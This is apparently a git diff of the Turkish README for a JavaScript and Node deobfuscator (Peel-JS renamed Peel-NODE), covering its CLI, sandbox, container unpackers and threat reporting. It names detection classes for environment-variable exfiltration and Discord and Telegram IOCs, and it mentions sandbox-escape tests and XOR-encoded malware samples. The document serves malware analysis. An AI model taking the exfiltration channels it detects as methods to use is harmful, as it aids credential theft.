+| `-m, --source-map`, `--out-map` | kaynak haritasından isim kurtar; çıktıdan girdiye harita yaz |
+| `-s, --split <dizin>` | webpack, esbuild, browserify ya da Parcel paketinin modüllerini ayrı dosyalara yaz |
+| `-p, --profile`, `-l, --level` | pass profili (`all`, `auto` ya da araç adı) ve 1–4 arası seviye |
+| `--order-search`, `--cascade` | birkaç pass sırası dene ve en iyi doğrulanmış sonucu tut; ya da seviye seviye çöz |
+| `--vm-out <dizin>`, `--jsvmp` | bytecode VM'ler için bytecode, assembly, IR ve çevrilmiş kodu yaz |
+| `--git <dizin>` | her pass bir commit olacak şekilde git deposu oluştur |
 | `--rules`, `--plugin`, `--trust` | dönüşüm kuralları, eklentiler ve imzalı eklentiler için güvenilen Ed25519 anahtarları |
-| `--fail-on <düzey>` | risk `low`, `medium` ya da `high` düzeyine ulaşırsa 4 koduyla çıkma (CI için) |
+| `--fail-on <düzey>` | risk `low`, `medium` ya da `high` düzeyine ulaşırsa 4 koduyla çık (CI için) |
+| `--no-sandbox`, `--no-deep` | yalnızca statik pass'ler; ya da pass başına davranış denetimini atla |
 | `--lang <tr\|en>` | kod içi açıklamaların ve HTML raporun dili |
-| `-w, --watch`, `-q, --quiet`, `--json` | değişiklikleri izleme, logları susturma, sonuçları JSON olarak yazma |
+| `-w, --watch`, `-q, --quiet`, `--json` | değişiklikleri izle, logları sustur, sonuçları JSON olarak yaz |
 
-Alt komutlar (`peel <komut> --help`):
-
-| Komut | |
-|---|---|
-| `peel diff eski.js yeni.js` | yeniden adlandırmaları yok sayan, fonksiyonları sürümler arasında eşleyen anlamsal fark; `--port-names` adlarınızı taşır |
-| `peel track <dosya\|url>` | bir script'i izler, her yeni sürümü çözer ve neyin değiştiğini raporlar |
-| `peel serve` | `127.0.0.1` üzerinde bearer token'lı yerel REST API |
-| `peel bot` | imza denetimli Slack / Discord slash komut botu |
-| `peel asar app.asar -o dizin` | Electron arşivini açar ve script'lerini çözer |
-| `peel symbols a.js b.js` | dosyalar arası sembol haritası; `--rename eski=yeni` her yerde yeniden adlandırır |
-| `peel share` / `peel unshare` | kodu URL parçasında taşıyan, isteğe bağlı AES-GCM şifreli bağlantı |
-| `peel plugin keygen\|sign\|verify` | pass eklentilerini imzalama ve doğrulama |
-| `peel asm`, `peel vm-compare` | VM disassembly'si ve iki VM derlemesinin karşılaştırılması |
-| `peel explain`, `techniques`, `learn`, `ctf`, `obfuscate --test`, `anonymize`, `history`, `changelog`, `passes` | öğrenme araçları, test örneği anonimleştirici, yerel geçmiş |
+Alt komutlar (`peel-node <komut> --help`): `diff`, `track`, `history`, `serve`, `bot`, `asar`, `symbols`, `share`,
+`unshare`, `plugin`, `explain`, `techniques`, `learn`, `ctf`, `obfuscate`, `anonymize`, `changelog`, `passes`, `asm`, `vm-compare`.
 
 Çıkış kodları: `0` tamam, `1` hata, `2` kullanım, `3` değişiklik (`track --once`), `4` risk eşiğine ulaşıldı.
 
 ## Kütüphane
 
 ```bash
-npm install github:LLCForge/Peel-JS
+npm install github:LLCForge/Peel-NODE
 ```
 
 ```js
-import { peel, deobfuscate, analyze, semanticDiff } from 'peel-js';
+import { peel } from 'peel-node';
 
-const { code, report, verified } = await peel(gizliKaynak);
-console.log(code);                 // okunur kod
-console.log(verified);             // her değişiklik davranış denetiminden geçtiyse true
-console.log(report.fingerprint);   // [{ name: 'obfuscator.io', confidence: 0.85, … }]
-console.log(report.iocs.urls);     // ['https://api.example.com/track']
+const { code, report, verified } = await peel(gizliKaynak, { env: 'node' });
+console.log(code);                        // okunur kod
+console.log(verified);                    // her değişiklik davranış denetiminden geçtiyse true
+console.log(report.threat.classes);       // [{ id: 'env-exfil', score: 60, confidence: 'high', evidence: […] }]
+console.log(report.threat.node.iocs);     // { discordWebhooks, telegram, downloads, pastes }
 ```
 
-TypeScript tipleri pakete dahildir. Node'a özgü yardımcılar (dosya tabanlı geçmiş, stil dosyası arama, Semgrep) `peel-js/node` altındadır.
-`npm run build:lib` tek dosyalık bir ESM paketi üretir.
+Paket açıcılar [`src/node/unpack.js`](src/node/unpack.js) içindedir (`unpack(bytes, name)`) ve hem tarayıcıda hem Node'da çalışır.
+TypeScript tipleri dahildir. `npm run build:lib` tek dosyalık bir ESM paketi üretir.
 
 ## Entegrasyonlar
 
-Hepsi yerelde çalışır. Hiçbiri kodunuzu yüklemez; sunucular yalnızca `127.0.0.1`'e bağlanır.
-
 | | |
 |---|---|
-| **GitHub Action** | `uses: LLCForge/Peel-JS@main` ve `files: dist/**/*.js`; code scanning için SARIF ve adım özeti yazar |
-| **VS Code** | [`extensions/vscode`](extensions/vscode): açık dosyayı ya da seçimi çözer, raporu yan panelde gösterir |
-| **mitmproxy, Burp Suite** | [`extensions/mitmproxy`](extensions/mitmproxy), [`extensions/burp`](extensions/burp): proxy'den geçen script'leri çözer |
-| **Jupyter, Observable** | [`extensions/jupyter`](extensions/jupyter), [`extensions/observable`](extensions/observable) |
-| **Semgrep** | [`extensions/semgrep`](extensions/semgrep): çözülmüş çıktı için kurallar |
-| **Masaüstü** | [`src-tauri`](src-tauri): Tauri uygulaması (`cargo install tauri-cli --version ^2 && cargo tauri build`) |
+| **GitHub Action** | [`action.yml`](action.yml): `uses: LLCForge/Peel-NODE@main` ve `files: dist/**/*.js`; `bin/peel-node.js`'i çalıştırır, SARIF ve adım özeti yazar, risk düzeyinde başarısız olur |
+| **REST API, botlar** | `peel-node serve` (bearer token, yalnızca `127.0.0.1`) ve `peel-node bot` (Slack / Discord, imza denetimi) |
+| **Editörler ve araçlar** | [`extensions/`](extensions): VS Code, mitmproxy, Burp Suite, Jupyter, Observable, Semgrep; Peel-JS'ten devralındı |
+| **Masaüstü** | [`src-tauri`](src-tauri): bir Tauri uygulaması |
 
 ## Nasıl çalışır
 
 ```mermaid
 flowchart LR
-  A[girdi] --> B[metin pass'leri<br/>Function, eval, packer,<br/>JSFuck, AAEncode]
-  B --> C[parse<br/>Babel, hata kurtarma yok]
-  C --> D[sandbox bağlamı<br/>worker içinde QuickJS]
-  D --> E[AST pass'leri<br/>değişiklik durana kadar tur]
-  E -->|her pass'ten sonra| F{yeniden parse,<br/>davranış karşılaştır}
+  A[girdi dosyası] --> U{kapsayıcı mı?}
+  U -->|pkg, nexe, SEA,<br/>tgz, asar, zip| V[bellekte aç<br/>girişleri işaretle]
+  U -->|.jsc / bytecode| W[yalnızca başlık<br/>+ dizgeler + IOC]
+  U -->|JS| B
+  V --> B[metin pass'leri]
+  B --> C[parse]
+  C --> D[sandbox<br/>QuickJS + Node öykünmesi]
+  D --> E[AST pass'leri<br/>node-layers dahil]
+  E -->|her pass'ten sonra| F{yeniden parse ve<br/>davranış karşılaştırması}
   F -->|aynı| E
-  F -->|farklı| G[geri al ya da<br/>güvenli kısmı tut]
+  F -->|farklı| G[geri al]
   G --> E
-  E --> H[okunabilirlik pass'leri<br/>adlar, let/const, açıklamalar]
-  H --> I[prettier]
-  I --> J[rapor]
+  E --> H[okunurluk pass'leri]
+  H --> I[rapor + Node tehdit analizi]
 ```
-
-Her pass, [`src/passes/`](src/passes) içinde `export async function run(ast, ctx)` imzalı küçük bir modüldür.
-Sıra, seviyeler ve bağımlılıklar [`src/core/registry.js`](src/core/registry.js) içindedir.
 
 | Klasör | İçerik |
 |---|---|
-| `src/passes/` | 57 pass |
+| `src/node/` | paket açıcılar (`unpack.js`), V8 kod önbelleği okuyucu (`v8cache.js`), Node tehdit analizi (`threat.js`) |
+| `src/passes/` | `38-node-layers.js` dahil 58 pass |
+| `src/sandbox/` | QuickJS host'u, tarayıcı taklitleri, Node öykünmesi (`node-stubs.js`), ortam tespiti, bekçi |
 | `src/core/` | pipeline, parse, tespit, kodlamalar, kripto, tehdit analizi, VM çevirisi |
-| `src/sandbox/` | QuickJS host'u, tarayıcı taklitleri, bekçi, worker ve `worker_thread` host'ları |
-| `src/analysis/`, `src/opt/`, `src/symbolic/` | CFG, veri akışı, SSA, çözücü, sembolik ve concolic yürütme |
-| `src/naming/` | yeniden adlandırma, tip çıkarımı, özetler, kütüphane tanıma |
-| `src/ui/` | web arayüzü |
-| `src/cli/`, `src/server/` | CLI, REST API ve botlar |
-| `test/` | fixture'lar, birim testleri ve benchmark |
+| `src/analysis/`, `src/opt/`, `src/symbolic/` | CFG, veri akışı, SSA, çözücü, sembolik ve konkolik yürütme |
+| `src/naming/`, `src/ui/` | yeniden adlandırma ve tip çıkarımı; web arayüzü |
+| `src/cli/`, `src/server/`, `bin/` | `peel-node` CLI'ı, REST API ve botlar |
+| `test/` | fixture'lar, Node örnekleri, birim testleri ve benchmark |
 
 ## Güvenlik modeli
 
-- Güvenilmeyen kod yalnızca bir worker içindeki QuickJS'te (WebAssembly) çalışır. Worker'ın bellek sınırı ve kesme süresi vardır;
-  kilitlenirse (ör. felaket düzeyde regex geri izlemesi) bekçi onu yeniden başlatır. **Durdur** onu anında sonlandırır.
-- Sandbox'ta ağ ve gerçek DOM yoktur. Tarayıcı API'leri, kodun ne yapmaya çalıştığını kaydeden taklitlerdir.
-  Her çalıştırma tekrarlanabilsin diye zaman ve `Math.random` sabittir.
-- Test paketinde 18 sandbox kaçış denemesi var (host prototip kirletme, `Function` ve constructor zincirleri, zamanlayıcılar,
-  worker'lar, import'lar ve diğerleri). Hepsinin başarısız olması gerekir.
-- Eklentilerin, güvendiğiniz bir anahtarla Ed25519 imzası taşıması zorunlu tutulabilir.
-- İsteğe bağlı gerçek DOM modu kodu `Content-Security-Policy: default-src 'none'` olan sandbox'lı bir iframe'de çalıştırır;
-  kod hiçbir şey yükleyemez. Durum çubuğu sayfanın yaptığı her dış isteği sayar.
+- Güvenilmeyen kod yalnızca bir worker (Node'da `worker_thread`) içindeki QuickJS'te (WebAssembly) çalışır; bellek sınırı,
+  kesme süresi ve kilitlenen motoru yeniden başlatan bir bekçi vardır.
+- Node öykünmesi tasarım gereği sahtedir: `fs`, `child_process`, `net`, `http` ve diğerleri yalnızca çağrıları kaydeder.
+  `process.env` sabit, sır içermeyen sistem değişkenleri taşır; sizinkileri asla.
+- Kapsayıcılar bellekte baytlardan ayrıştırılır. `--out-dir` istemediğiniz sürece arşivden ya da çalıştırılabilirden diske hiçbir şey
+  yazılmaz; açılan çalıştırılabilirler asla çalıştırılmaz.
+- Test paketinde 18 sandbox kaçış denemesi vardır; hepsinin başarısız olması gerekir.
 
 ## Dürüst sınırlar
 
-- Davranış denetimi konsol çıktısını ve gözlenebilir yan etkileri karşılaştırır. Hiçbir şey yazdırmayan ve hiçbir şeye dokunmayan kod
-  daha zayıf bir denetimden geçer; rapor bunu belirtir.
-- **Tek bir çalıştırma gözlenerek** çözülen değerler, o çalıştırmanın geçtiği yolları kapsar. Geçmediği yollar kapsanmaz.
-- WebAssembly içindeki mantık ve çalışma anında sunucudan alınan bir anahtarla şifrelenmiş string'ler kapsam dışıdır.
-- Çok büyük girdiler (birkaç MB) çalışır, ama pass'ler ana thread'de çalıştığı için sayfa bir süre meşgul kalabilir.
-- Z3 isteğe bağlıdır. WebAssembly dosyası yaklaşık 39 MB'tır ve cross-origin isolated bir sayfa (COOP / COEP başlıkları) gerektirir.
-  Bu yoksa yerleşik çözücü kullanılır.
-- Slack / Discord botları ve Burp eklentisi henüz gerçek çalışma alanlarında denenmedi. VS Code eklentisi Marketplace'te değil.
+- **V8 bytecode erişim dışındadır.** bytenode `.jsc` dosyaları, pkg'nin bytecode'a derlediği dosyalar ve SEA anlık görüntüleri
+  kaynak değil, dizge ve IOC verir. Bilinen tabloda yalnızca bir V8 sürüm karması vardır (V8 14.1, Node 25.8); diğerleri ham karma olarak gösterilir.
+- zstd ile sıkıştırılmış pkg yükleri desteklenmez. SEA `execArgv` listesi ayrıştırılmaz. Eski nexe kaynak tablosu gerçek çıktıyla
+  denetlenmedi.
+- Tehdit sınıfları sezgiseldir. Rapordaki kanıt metinleri şimdilik `--lang` ne olursa olsun Türkçedir.
+- Davranış denetimi konsol çıktısını ve gözlenebilir yan etkileri karşılaştırır; tek bir çalıştırma gözlenerek çözülen değerler
+  yalnızca o çalıştırmanın geçtiği yolları kapsar.
+- `extensions/` altındaki eklentiler Peel-JS'ten devralındı ve hâlâ `peel-js` paket adına başvuruyor.
+- JScrambler gibi ticari korumalar tanınır ama çözülmez.
 
 ## Testler
 
 ```bash
-npm test          # 158 fixture tüm pipeline'dan davranış denetimiyle geçer, ardından 39 birim test dosyası
-npm test packer   # tek bir fixture, log ve çıktısıyla
-npm run bench     # 8 obfuscator'dan 131 örnek: çıktı aynı davranmalı ve beklenen string'leri içermeli
+npm test          # 173 fixture tüm pipeline'dan davranış denetimiyle geçer, ardından 42 birim test dosyası
+npm run bench     # 131 gizlenmiş örnek: çıktı aynı davranmalı ve beklenen dizgeleri içermeli
 ```
 
-Fixture, [`test/fixtures/`](test/fixtures) içinde yönerge yorumları olan bir `.js` dosyasıdır:
-
-```js
-// LEVEL: 3                      isteğe bağlı, varsayılan 4
-// EXPECT: console.log("hi");    çıktıda bulunmalı
-// GONE: atob                    çıktıda bulunmamalı
-```
+Paket açıcılar [`test/node-samples/`](test/node-samples) altındaki gerçek pkg, nexe, SEA, bytenode, npm, asar ve zip çıktılarıyla
+test edilir (antivirüslerin diskte işaretlememesi için XOR ile kodlanmış olarak saklanır).
 
 ## Katkı
 
-Issue ve pull request'ler memnuniyetle karşılanır. PEEL'in çözemediği bir örneğiniz varsa küçük ve anonimleştirilmiş bir sürümüyle
-issue açın. `peel anonymize ornek.js`, kaynağı ele verebilecek string'leri ve adları temizler.
-Düzeltmeyi kanıtlayan bir fixture ekleyen pull request en hızlı birleşen pull request'tir.
-
-Benchmark'taki obfuscator'ların nasıl çalıştığı ve PEEL'in her tekniği nasıl geri aldığı
-[`docs/research/obfuscators.md`](docs/research/obfuscators.md) belgesinde anlatılıyor.
+Issue ve pull request'ler memnuniyetle karşılanır. Peel-NODE'un açamadığı bir paket ya da çalıştırılabilir varsa küçük ve zararsız
+bir yeniden üretimiyle issue açın. `peel-node anonymize ornek.js`, kaynağı belli edebilecek dizgeleri ve adları kaldırır.
+Düzeltmeyi kanıtlayan bir fixture ekleyen pull request en hızlı birleştirilen yoldur.
 
 ## Lisans
 
-[MIT](LICENSE). Ticari kullanım dahil özgürce kullanabilir, değiştirebilir ve dağıtabilirsiniz. Ücretli sürüm, hesap ya da telemetri yoktur.
+[MIT](LICENSE). Ticari kullanım dahil kullanmak, değiştirmek ve yeniden dağıtmak serbesttir. Ücretli sürüm, hesap ya da telemetri yoktur.
